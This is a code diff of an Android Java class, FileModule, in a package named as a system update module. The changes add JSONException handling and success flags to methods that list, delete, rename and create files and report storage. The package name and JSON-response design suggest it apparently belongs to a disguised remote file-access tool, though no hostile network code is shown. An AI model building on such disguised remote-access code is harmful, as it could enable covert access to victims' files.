@@ -1,22 +1,15 @@
 package com.android.system.update.modules;
 
 import android.content.Context;
-import android.content.Intent;
-import android.net.Uri;
-import android.os.Build;
 import android.os.Environment;
 import android.util.Base64;
-import android.webkit.MimeTypeMap;
 
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
-import java.io.FileWriter;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipOutputStream;
-
 import org.json.JSONArray;
 import org.json.JSONObject;
+import org.json.JSONException;
 
 public class FileModule {
     private Context context;
@@ -39,6 +32,7 @@ public class FileModule {
                 JSONObject error = new JSONObject();
                 error.put("error", "Directory does not exist");
                 error.put("path", path);
+                error.put("success", false);
                 return error.toString();
             }
             
@@ -46,12 +40,14 @@ public class FileModule {
                 JSONObject error = new JSONObject();
                 error.put("error", "Cannot read directory - permission denied");
                 error.put("path", path);
+                error.put("success", false);
                 return error.toString();
             }
             
             JSONObject result = new JSONObject();
             result.put("current_path", dir.getAbsolutePath());
             result.put("parent_path", dir.getParent() != null ? dir.getParent() : "");
+            result.put("success", true);
             
             JSONArray filesList = new JSONArray();
             File[] files = dir.listFiles();
@@ -80,16 +76,15 @@ public class FileModule {
             
             result.put("files", filesList);
             result.put("total", filesList.length());
-            result.put("success", true);
             
             return result.toString();
             
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
         } catch (Exception e) {
             e.printStackTrace();
-            JSONObject error = new JSONObject();
-            error.put("error", e.getMessage());
-            error.put("success", false);
-            return error.toString();
+            return createErrorResponse(e.getMessage());
         }
     }
     
@@ -122,6 +117,9 @@ public class FileModule {
             
             return response.toString();
             
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
         } catch (Exception e) {
             e.printStackTrace();
             return createErrorResponse(e.getMessage());
@@ -152,6 +150,9 @@ public class FileModule {
                 return createErrorResponse("Failed to delete");
             }
             
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
         } catch (Exception e) {
             e.printStackTrace();
             return createErrorResponse(e.getMessage());
@@ -192,6 +193,9 @@ public class FileModule {
                 return createErrorResponse("Failed to create folder");
             }
             
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
         } catch (Exception e) {
             e.printStackTrace();
             return createErrorResponse(e.getMessage());
@@ -219,6 +223,9 @@ public class FileModule {
                 return createErrorResponse("Failed to rename");
             }
             
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
         } catch (Exception e) {
             e.printStackTrace();
             return createErrorResponse(e.getMessage());
@@ -247,6 +254,9 @@ public class FileModule {
             
             return response.toString();
             
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
         } catch (Exception e) {
             e.printStackTrace();
             return createErrorResponse(e.getMessage());
@@ -282,6 +292,9 @@ public class FileModule {
             
             return response.toString();
             
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
         } catch (Exception e) {
             e.printStackTrace();
             return createErrorResponse(e.getMessage());
@@ -332,6 +345,9 @@ public class FileModule {
             
             return response.toString();
             
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
         } catch (Exception e) {
             e.printStackTrace();
             return createErrorResponse(e.getMessage());
@@ -383,8 +399,12 @@ public class FileModule {
                 info.put("external", externalInfo);
             }
             
+            info.put("success", true);
             return info.toString();
             
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
         } catch (Exception e) {
             e.printStackTrace();
             return createErrorResponse(e.getMessage());
@@ -414,7 +434,7 @@ public class FileModule {
             error.put("success", false);
             error.put("error", message);
             return error.toString();
-        } catch (Exception e) {
+        } catch (JSONException e) {
             return "{\"success\":false,\"error\":\"" + message + "\"}";
         }
     }
